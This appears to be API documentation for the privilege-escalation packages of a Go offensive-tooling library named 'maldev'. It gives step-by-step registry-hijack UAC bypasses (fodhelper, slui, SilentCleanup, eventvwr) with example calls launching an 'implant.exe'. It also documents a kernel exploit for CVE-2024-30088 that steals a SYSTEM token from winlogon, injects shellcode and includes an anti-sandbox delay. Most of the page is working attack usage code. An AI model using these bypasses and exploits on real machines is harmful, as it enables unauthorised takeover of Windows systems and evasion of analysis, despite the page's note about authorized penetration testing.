[← Back to README](../README.md)

# Privilege Escalation

This page documents privilege-related packages in maldev:

- **`privesc/uac`** -- UAC bypass via auto-elevated Windows executables (T1548.002)
- **`privesc/cve202430088`** -- Kernel TOCTOU race condition for LPE to SYSTEM (CVE-2024-30088)
- **`win/privilege`** -- SeDebug / SeImpersonate / SeBackup privilege enable/disable via AdjustTokenPrivileges (T1134)

> **Related API docs**
> - Token theft, duplication and impersonation: [`docs/win.md`](win.md) (package `win/token`)
> - Cross-user impersonation: [`docs/win.md`](win.md) (package `win/impersonate`)
> - Technique walkthroughs: [`docs/techniques/tokens/`](techniques/tokens/README.md)

`win/privilege` exposes the full SE_NAMES enum and two entrypoints:
`Enable(name)` / `Disable(name)` — thin wrappers around
`OpenProcessToken` + `LookupPrivilegeValue` + `AdjustTokenPrivileges`.
See package source for the complete constant list; the most commonly
used are `SeDebugPrivilege`, `SeImpersonatePrivilege`,
`SeBackupPrivilege`, `SeTakeOwnershipPrivilege`.

---

## privesc/uac -- User Account Control Bypass

Package `privesc/uac` implements four UAC bypass techniques that abuse auto-elevated Windows binaries. Each function takes a path to an executable and launches it with high integrity (bypassing the UAC prompt) by hijacking how the auto-elevated binary resolves its handler.

**MITRE ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)
**Platform:** Windows only
**Prerequisites:** The current user must be a member of the local Administrators group (medium integrity). These techniques do NOT work from a standard user account.
**Detection:** Registry key creation under `HKCU\Software\Classes`, process creation of known auto-elevated binaries.

### Functions

#### `FODHelper`

```go
func FODHelper(path string) error
```

**Purpose:** Executes `path` with high integrity by abusing the `fodhelper.exe` auto-elevation mechanism.

**Parameters:**
- `path` -- Full path to the executable to run elevated (e.g., `C:\Windows\System32\cmd.exe`)

**How it works:**
1. Creates a random registry key name under `HKCU\Software\Classes\<random>\shell\open\command`
2. Sets the default value to `path` and adds an empty `DelegateExecute` value
3. Creates `HKCU\Software\Classes\ms-settings\CurVer` with the random key name as default value -- this redirects the `ms-settings` protocol handler
4. Launches `fodhelper.exe` (auto-elevated) which reads the `ms-settings` handler, follows the `CurVer` redirect, and executes `path` at high integrity
5. Cleans up all registry keys via deferred deletes

**Supported versions:** Windows 10 and later.

**Example:**

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/privesc/uac"
)

func main() {
    err := uac.FODHelper(`C:\Windows\System32\cmd.exe`)
    if err != nil {
        log.Fatal(err)
    }
}
```

---

#### `SLUI`

```go
func SLUI(path string) error
```

**Purpose:** Executes `path` with high integrity by abusing the `slui.exe` (Software Licensing UI) auto-elevation.

**Parameters:**
- `path` -- Full path to the executable to run elevated

**How it works:**
1. Creates `HKCU\Software\Classes\exefile\shell\open\command` with `path` as the default value and an empty `DelegateExecute`
2. Waits 1 second for registry propagation
3. Launches `slui.exe` which is auto-elevated and reads the `exefile` handler, executing `path` at high integrity
4. Cleans up registry keys

**Example:**

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/privesc/uac"
)

func main() {
    err := uac.SLUI(`C:\implant.exe`)
    if err != nil {
        log.Fatal(err)
    }
}
```

---

#### `SilentCleanup`

```go
func SilentCleanup(path string) error
```

**Purpose:** Executes `path` with high integrity by abusing the `SilentCleanup` scheduled task which runs with highest privileges and expands the `%windir%` environment variable.

**Parameters:**
- `path` -- Full path to the executable to run elevated

**How it works:**
1. Opens `HKCU\Environment` (the per-user environment variables)
2. Sets the `windir` value to `cmd.exe start /B <path>` -- this hijacks the `%windir%` expansion
3. Waits 1 second for propagation
4. Triggers the `\Microsoft\Windows\DiskCleanup\SilentCleanup` scheduled task via `schtasks.exe /RUN`
5. The task runs at high integrity, expands `%windir%`, which now points to `cmd.exe start /B <path>`
6. Restores the original `windir` value via deferred `DeleteValue`

**Example:**

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/privesc/uac"
)

func main() {
    err := uac.SilentCleanup(`C:\implant.exe`)
    if err != nil {
        log.Fatal(err)
    }
}
```

---

#### `EventVwr`

```go
func EventVwr(path string) error
```

**Purpose:** Executes `path` with high integrity by abusing the `eventvwr.exe` auto-elevation and its MSC file handler lookup.

**Parameters:**
- `path` -- Full path to the executable to run elevated

**How it works:**
1. Creates `HKCU\Software\Classes\mscfile\shell\open\command` with `cmd.exe /C start <path>` as the default value
2. Waits 2 seconds for `eventvwr.exe` to read the registry key
3. Launches `eventvwr.exe` (auto-elevated) which opens an `.msc` file, triggering the hijacked `mscfile` handler
4. Cleans up registry keys

**Example:**

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/privesc/uac"
)

func main() {
    err := uac.EventVwr(`C:\implant.exe`)
    if err != nil {
        log.Fatal(err)
    }
}
```

---

#### `EventVwrLogon`

```go
func EventVwrLogon(domain, user, password, path string) error
```

**Purpose:** Same as `EventVwr` but uses `CreateProcessWithLogonW` to launch `eventvwr.exe` under alternate credentials. Useful when you have credentials for a different admin account on the same machine.

**Parameters:**
- `domain` -- Domain name (e.g., `"WORKGROUP"`, `"CORP"`)
- `user` -- Username
- `password` -- Password in cleartext
- `path` -- Full path to the executable to run elevated

**How it works:** Same registry hijack as `EventVwr`, but calls `CreateProcessWithLogonW` with `LOGON_WITH_PROFILE` to spawn `eventvwr.exe` under the specified credentials. The process is hidden via `SW_HIDE`.

**Example:**

```go
package main

import (
    "log"

    "github.com/oioio-space/maldev/privesc/uac"
)

func main() {
    err := uac.EventVwrLogon(
        "CORP",
        "localadmin",
        "P@ssw0rd!",
        `C:\implant.exe`,
    )
    if err != nil {
        log.Fatal(err)
    }
}
```

---

## privesc/cve202430088 -- Kernel LPE to SYSTEM

Package `cve202430088` implements CVE-2024-30088, a Windows kernel TOCTOU (Time-of-Check-to-Time-of-Use) race condition in `AuthzBasepCopyoutInternalSecurityAttributes` that allows local privilege escalation from any user to `NT AUTHORITY\SYSTEM`.

This is a faithful port of the Metasploit DLL (exploit.c) to pure Go. No driver or embedded DLL is required.

**CVE:** CVE-2024-30088
**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation)
**Platform:** Windows only
**Affected versions:** Windows 10 (1507-22H2), Windows 11 (21H2-23H2), Windows Server 2019/2022, before the June 2024 patch.

> **WARNING:** This exploit races against kernel memory. It may cause a BSOD (Blue Screen of Death) if the race corrupts kernel structures. Use only in authorized penetration testing engagements with proper risk acceptance.

### Types

#### `Status`

```go
type Status int

const (
    StatusSuccess        Status = iota // SYSTEM token obtained
    StatusTimeout                      // Race did not converge in time
    StatusCrashed                      // Panic recovered during race
    StatusNotVulnerable                // System is patched
)
```

#### `Config`

```go
type Config struct {
    ExePath string        // Executable to launch as SYSTEM (optional)
    Args    []string      // Arguments for the executable
    Hidden  bool          // Launch with SW_HIDE (no visible window)
    Timeout time.Duration // Race loop timeout (default: 5 minutes)
    Logger  *slog.Logger  // Structured logger (nil disables logging)
}
```

#### `Result`

```go
type Result struct {
    Status Status         // Outcome of the exploit
    Token  syscall.Handle // SYSTEM token (valid only when Status == StatusSuccess)
    Err    error          // Error detail when Status != StatusSuccess
}
```

#### `VersionInfo`

```go
type VersionInfo struct {
    Major      uint32 // e.g., 10
    Minor      uint32 // e.g., 0
    Build      uint32 // e.g., 19045
    Revision   uint32 // UBR from registry
    Vulnerable bool
    Edition    string // e.g., "Windows 10 22H2"
}
```

### Functions

#### `CheckVersion`

```go
func CheckVersion() (VersionInfo, error)
```

**Purpose:** Queries the running Windows version and checks whether it is vulnerable to CVE-2024-30088.

**Returns:** A `VersionInfo` struct with the OS version details and a `Vulnerable` boolean.

**How it works:** Uses `win/version.Windows()` to read `Major`, `Minor`, `Build`, and `UBR` (Update Build Revision) from the system. Compares the build number against a lookup table of known vulnerable builds. A system is vulnerable when its UBR is strictly less than the patch threshold for its build.

**Vulnerable builds:**

| Build | Edition | Patched at revision |
|-------|---------|-------------------|
| 10240 | Windows 10 1507 | 20680 |
| 14393 | Windows 10 1607 / Server 2016 | 7070 |
| 17763 | Windows 10 1809 / Server 2019 | 5936 |
| 19044 | Windows 10 21H2 | 4529 |
| 19045 | Windows 10 22H2 | 4529 |
| 22000 | Windows 11 21H2 | 3019 |
| 22621 | Windows 11 22H2 | 3737 |
| 22631 | Windows 11 23H2 | 3737 |
| 20348 | Windows Server 2022 | 2522 |
| 25398 | Windows Server 2022 23H2 | 950 |

**Example:**

```go
package main

import (
    "fmt"
    "log"

    "github.com/oioio-space/maldev/privesc/cve202430088"
)

func main() {
    vi, err := cve202430088.CheckVersion()
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Edition:    %s\n", vi.Edition)
    fmt.Printf("Build:      %d.%d.%d.%d\n", vi.Major, vi.Minor, vi.Build, vi.Revision)
    fmt.Printf("Vulnerable: %v\n", vi.Vulnerable)
}
```

---

#### `Run`

```go
func Run(ctx context.Context) (*Result, error)
```

**Purpose:** Executes the CVE-2024-30088 exploit and returns a duplicated SYSTEM token. The caller is responsible for closing `Result.Token` with `syscall.CloseHandle` when done.

**Parameters:**
- `ctx` -- Context for cancellation. The exploit respects context cancellation during the race loop.

**Returns:** A `*Result` containing the status and (on success) a SYSTEM token handle.

**How it works:** Delegates to `RunWithExec` with an empty `Config` (token-only mode, no process launch).

**BSOD risk:** The exploit races `NtQueryInformationToken` against a high-priority thread that corrupts a `SecurityAttributesList` buffer. If the race corrupts adjacent kernel memory, a BSOD will occur. The risk is inherent to kernel race conditions and cannot be eliminated.

**Example:**

```go
package main

import (
    "context"
    "fmt"
    "log"
    "syscall"

    "github.com/oioio-space/maldev/privesc/cve202430088"
)

func main() {
    result, err := cve202430088.Run(context.Background())
    if err != nil {
        log.Fatal(err)
    }
    defer syscall.CloseHandle(result.Token)

    fmt.Printf("Status: %s\n", result.Status)
    fmt.Printf("SYSTEM token: 0x%X\n", result.Token)

    // Use the token with win/token, win/impersonate, or
    // windows.CreateProcessAsUser to run commands as SYSTEM.
}
```

---

#### `RunWithExec`

```go
func RunWithExec(ctx context.Context, cfg Config) (*Result, error)
```

**Purpose:** Executes the exploit and optionally launches an executable with SYSTEM privileges. If `cfg.ExePath` is empty, it behaves identically to `Run` (returns the token only).

**Parameters:**
- `ctx` -- Context for cancellation
- `cfg` -- Configuration controlling timeout, executable path, arguments, visibility, and logging

**Returns:** A `*Result` with the exploit outcome.

**How it works -- step by step:**

1. **Anti-sandbox busy wait** -- Burns CPU for 200ms using trigonometric computations. Unlike `time.Sleep`, this cannot be fast-forwarded by sandbox environments that hook `NtDelayExecution`.

2. **Version check** -- Calls `CheckVersion()` to verify the target is vulnerable. Returns `StatusNotVulnerable` if patched.

3. **Locate winlogon.exe** -- Enumerates processes via `process/enum.FindByName("winlogon.exe")` to get the PID.

4. **TOCTOU race condition** -- The core exploit:
   - Opens the current process token with `TOKEN_ALL_ACCESS`
   - Leaks the kernel address of the token object via `NtQuerySystemInformation(SystemExtendedHandleInformation)`
   - Allocates a buffer and queries `NtQueryInformationToken(TokenAccessInformation)` to locate the `SecurityAttributesList`
   - Spawns a high-priority native thread that repeatedly overwrites the `SecurityAttributesList` Name field with a crafted kernel pointer
   - Simultaneously hammers `NtQueryInformationToken` 5000 times per iteration to trigger the TOCTOU
   - When the race is won, the process token is silently elevated, allowing `OpenProcess(PROCESS_ALL_ACCESS)` on winlogon.exe

5. **Token theft** -- Enumerates system handles to find a token handle in winlogon, duplicates it into the current process via `DuplicateHandle`, then creates a primary token via `DuplicateTokenEx`.

6. **Optional process launch** -- If `cfg.ExePath` is set, injects shellcode into winlogon that calls `kernel32!WinExec` to launch the executable in SYSTEM context. This avoids `CreateProcessWithTokenW` which fails because the corrupted token breaks DLL resolution.

**Example -- launch cmd.exe as SYSTEM:**

```go
package main

import (
    "context"
    "log"
    "time"

    "github.com/oioio-space/maldev/privesc/cve202430088"
)

func main() {
    // The exploit's Logger field is the internal *log.Logger wrapper
    // (no_logging-by-default in release builds). Pass nil to disable
    // logging; consumers inside the maldev module can build a logger
    // via internal/log.New(handler).
    cfg := cve202430088.Config{
        ExePath: `C:\Windows\System32\cmd.exe`,
        Hidden:  false,
        Timeout: 3 * time.Minute,
        Logger:  nil, // silent; or maldev-internal handler when building inside the module
    }

    result, err := cve202430088.RunWithExec(context.Background(), cfg)
    if err != nil {
        log.Fatalf("exploit failed: %s (status: %s)", err, result.Status)
    }

    log.Printf("exploit succeeded, SYSTEM token: 0x%X", result.Token)
}
```

**Example -- get SYSTEM token and impersonate:**

```go
package main

import (
    "context"
    "fmt"
    "log"
    "syscall"

    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/privesc/cve202430088"
    "github.com/oioio-space/maldev/win/token"
)

func main() {
    result, err := cve202430088.Run(context.Background())
    if err != nil {
        log.Fatal(err)
    }
    defer syscall.CloseHandle(result.Token)

    // Wrap in win/token.Token for high-level operations.
    // token.New takes (windows.Token, token.Type); the SYSTEM token from
    // the kernel exploit is a primary token.
    t := token.New(windows.Token(result.Token), token.Primary)
    details, err := t.UserDetails()
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("Running as: %s\\%s\n", details.Domain, details.Username)
}
```
